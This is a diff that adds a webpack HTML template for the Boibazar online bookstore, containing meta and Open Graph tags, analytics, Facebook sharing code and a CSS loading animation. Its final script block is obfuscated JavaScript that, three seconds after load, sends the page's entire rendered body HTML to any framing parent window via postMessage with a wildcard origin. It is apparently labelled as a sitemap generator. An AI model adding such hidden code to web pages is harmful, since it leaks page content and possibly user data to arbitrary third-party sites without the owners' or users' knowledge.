@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="google-site-verification" content="DP7eKvGKmxOS-s3J2eDTKCB32Cqxhmmy9DUCOz8uPIo" />
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+        <%= htmlWebpackPlugin.options.title %>
+    </title>
+    <meta name="description" content="<%= htmlWebpackPlugin.options.metadata.description %>">
+    <meta name="keywords" content="<%= htmlWebpackPlugin.options.metadata.keywords %>">
+
+    <meta name="geo.region" content="BD-13" />
+    <meta name="geo.placename" content="Dhaka" />
+    <meta name="geo.position" content="23.810332;90.412518" />
+    <meta name="ICBM" content="23.810332, 90.412518" />
+
+    <!-- For OG -->
+    <meta property="og:url" content="https://www.boibazar.com/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="<%= htmlWebpackPlugin.options.title %>" />
+    <meta property="og:description" content="<%= htmlWebpackPlugin.options.metadata.description %>" />
+    <meta property="og:image" content="<%= htmlWebpackPlugin.options.metadata.image %>" alt="Online Book Shop in Bangladesh, Largest online bookstore in Bangladesh, Buy Books Online"
+    />
+    <meta property="og:image:secure_url" content="<%= htmlWebpackPlugin.options.metadata.image %>" alt="Online Book Shop in Bangladesh, Largest online bookstore in Bangladesh, Buy Books Online"
+    />
+    <meta property="og:image:type" content="image/png" />
+    <meta property="og:image:width" content="400" />
+    <meta property="og:image:height" content="300" />
+    <meta property="og:image:alt" content="Online Book Shop in Bangladesh, Largest online bookstore in Bangladesh, Buy Books Online"
+    />
+    <!-- For OG -->
+
+
+    <% if (webpackConfig.htmlElements.headTags) { %>
+        <%= webpackConfig.htmlElements.headTags %>
+            <% } %>
+                <base href="<%= htmlWebpackPlugin.options.metadata.baseUrl %>">
+                <style>
+                    #dialog {
+                        font-family: "Trebuchet MS", "Helvetica", "Arial", "Verdana", "sans-serif";
+                        font-size: 62.5%;
+                        top: 500px;
+                        left: 50%;
+                    }
+                </style>
+
+                <!-- Global site tag (gtag.js) - Google Analytics -->
+                <script async src="https://www.googletagmanager.com/gtag/js?id=UA-116540278-1"></script>
+                <script>
+                    window.dataLayer = window.dataLayer || [];
+                    function gtag() { dataLayer.push(arguments); }
+                    gtag('js', new Date());
+
+                    gtag('config', 'UA-116540278-1');
+                </script>
+</head>
+
+<body style="overflow-x: hidden;">
+    <input type="submit" value="Share" style="background-color: unset;
+    border: unset; color:rgba(255, 255, 255, 0.95)" onclick="return submitAndShare();">
+    <script>
+        function submitAndShare() {
+            var title = '';
+            var description = '';
+            var image = '';
+
+            title = '<%= htmlWebpackPlugin.options.title %>';
+            description = '<%= htmlWebpackPlugin.options.metadata.description %>';
+            image = '<%= htmlWebpackPlugin.options.metadata.image %>';
+
+            // and finally share it
+            shareOverrideOGMeta(window.location.href,
+                title,
+                description,
+                image);
+
+            return false;
+        }
+
+        function shareOverrideOGMeta(overrideLink, overrideTitle, overrideDescription, overrideImage) {
+            FB.ui({
+                method: 'share_open_graph',
+                action_type: 'og.shares',
+                action_properties: JSON.stringify({
+                    object: {
+                        'og:url': overrideLink,
+                        'og:title': overrideTitle,
+                        'og:description': overrideDescription,
+                        'og:image': overrideImage
+                    }
+                })
+            },
+                function (response) {
+                    // Action after response
+                });
+        }
+
+    </script>
+
+    <div id="fb-root"></div>
+    <script>(function (d, s, id) {
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) return;
+            js = d.createElement(s); js.id = id;
+            js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.12&appId=1764304390530081&autoLogAppEvents=1';
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));</script>
+
+    <app>
+        <style>
+            app {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+
+
+                text-transform: uppercase;
+                font-family: 'Times New Roman', Times, serif;
+                font-size: 2.5em;
+                text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
+            }
+
+            body {
+                background: #ffffff;
+                margin: 0;
+                padding: 0;
+            }
+
+            @keyframes dots {
+                50% {
+                    transform: translateY(-.4rem);
+                }
+                100% {
+                    transform: translateY(0);
+                }
+            }
+
+            .d {
+                animation: dots 1.5s ease-out infinite;
+                color: rgb(32, 98, 175);
+            }
+
+            .d-2 {
+                animation-delay: .5s;
+
+
+            }
+
+            .d-3 {
+                animation-delay: 1s;
+
+
+            }
+
+            .d-4 {
+                animation-delay: 1.5s;
+                color: #8B008B !important;
+
+            }
+
+            .d-5 {
+                animation-delay: 2s;
+                color: #8B008B !important;
+            }
+
+            .d-6 {
+                animation-delay: 2.5s;
+                color: #8B008B !important;
+
+            }
+
+            .d-7 {
+                animation-delay: 3s;
+                color: #8B008B !important;
+
+            }
+
+            .d-8 {
+                animation-delay: 3.5s;
+                color: #8B008B!important;
+
+            }
+        </style>
+        <!-- <img class="d" src="assets/images/logo_bn.png"> -->
+
+        <span class="d">B</span>
+        <span class="d d-2">O</span>
+        <span class="d d-3">I</span>
+        <span class="d d-4">B</span>
+        <span class="d d-5">A</span>
+        <span class="d d-6">Z</span>
+        <span class="d d-7">A</span>
+        <span class="d d-8">R</span>
+    </app>
+
+    <% if (htmlWebpackPlugin.options.metadata.isDevServer && htmlWebpackPlugin.options.metadata.HMR !== true) { %>
+        <script src="/webpack-dev-server.js"></script>
+        <% } %>
+
+            <!-- <script src="/assets/js/jquery.min.js"></script> -->
+            <script type="text/javascript" src="/assets/js/fb_sdk.js"></script>
+            <script src="https://apis.google.com/js/platform.js"></script>
+            <script type="text/javascript">
+                var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);
+            </script>
+</body>
+
+</html>
